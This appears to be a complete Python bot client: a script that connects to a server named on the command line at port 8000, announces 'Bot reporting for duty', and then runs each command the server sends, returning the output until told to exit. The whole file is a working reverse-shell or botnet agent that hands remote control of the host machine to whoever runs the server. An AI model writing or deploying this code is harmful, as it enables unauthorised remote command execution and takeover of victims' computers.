import sys
import shlex
from subprocess import Popen, PIPE
from socket import *

serverName = sys.argv[1]
serverPort = 8000

# Create IPv4(AF_INET), TCPSocket(SOCK_STREAM)
clientSocket = socket(AF_INET, SOCK_STREAM)
clientSocket.connect((serverName, serverPort))

clientSocket.send("Bot reporting for duty".encode())

command = clientSocket.recv(4064).decode()

while command != "exit":
    # Use shlex.split to handle commands with spaces in arguments
    args = shlex.split(command)
    proc = Popen(args, stdout=PIPE, stderr=PIPE)
    result, err = proc.communicate()
    # Send both stdout and stderr results
    clientSocket.sendall(result + err)
    command = clientSocket.recv(4064).decode()

clientSocket.close()
